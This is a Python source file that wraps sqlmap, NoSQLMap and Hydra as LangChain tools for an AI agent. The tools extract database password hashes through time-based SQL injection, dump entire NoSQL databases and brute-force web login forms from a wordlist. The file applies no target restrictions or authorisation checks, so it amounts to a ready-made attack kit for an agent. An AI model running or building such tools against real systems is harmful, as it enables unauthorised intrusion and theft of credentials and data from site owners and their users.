from langchain_core.tools import tool
from pydantic import BaseModel
import subprocess

class SQLiInput(BaseModel):
    url: str
    data: str = ""
    technique: str = "T"
    time_sec: int = 3

class NoSQLiInput(BaseModel):
    url: str
    json_body: str = ""

class HydraInput(BaseModel):
    target: str
    login_path: str
    user: str
    wordlist: str
    fail_string: str

@tool(args_schema=SQLiInput)
async def RunSQLMap(url: str, data: str = "", technique: str = "T", time_sec: int = 3) -> str:
    """
    Guess passwords based on time-based SQL injection using SQLMap.
    Args:
        url (str): The target URL to test for SQL injection.
        data (str): Optional POST data to send with the request.
        technique (str): SQL injection technique to use (default is 'T' for time-based).
        time_sec (int): Time in seconds to wait for a response (default is 3).
    Returns:
        str: The output of the SQLMap command, including any errors.
    Raises:
        Exception: If there is an error running the SQLMap command.
    """
    try:
        cmd = ["sqlmap", "-u", url, "--technique", technique, "--time-sec", str(time_sec), "--batch"]
        if data:
            cmd += ["--data", data]
        cmd += ["--passwords"]
        result = subprocess.run(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
        return result.stdout + "\n" + result.stderr
    except Exception as e:
        return f"❌ Error running SQLMap: {str(e)}"

@tool(args_schema=NoSQLiInput)
async def RunNoSQLMap(url: str, json_body: str = "") -> str:
    """
    Run NoSQLMap to attempt NoSQL-based password guessing.
    Args:
        url (str): The target URL to test for NoSQL injection.
        json_body (str): Optional JSON body to send with the request.
    Returns:
        str: The output of the NoSQLMap command, including any errors.
    Raises:
        Exception: If there is an error running the NoSQLMap command.
    """
    try:
        cmd = ["python3", "nosqlmap.py", "-u", url]
        if json_body:
            cmd += ["-a", json_body]
        cmd += ["--dump-all"]
        result = subprocess.run(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
        return result.stdout + "\n" + result.stderr
    except Exception as e:
        return f"❌ Error running NoSQLMap: {str(e)}"

@tool(args_schema=HydraInput)
async def RunHydra(target: str, login_path: str, user: str, wordlist: str, fail_string: str) -> str:
    """
    Run Hydra to brute-force web login form password based on failure string.
    Args:
        target (str): The target URL to test for brute-force login.
        login_path (str): The path to the login form, e.g., "/login".
        user (str): The username to use for the brute-force attack.
        wordlist (str): Path to the wordlist file containing potential passwords.
        fail_string (str): String that indicates a failed login attempt.
    Returns:
        str: The output of the Hydra command, including any errors.
    Raises:
        Exception: If there is an error running the Hydra command.
    """
    try:
        url_path = f"{login_path}:username=^USER^&password=^PASS^:{fail_string}"
        cmd = ["hydra", "-l", user, "-P", wordlist, "http-post-form", url_path, "-s", "80", "-f", target]
        result = subprocess.run(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
        return result.stdout + "\n" + result.stderr
    except Exception as e:
        return f"❌ Error running Hydra: {str(e)}"
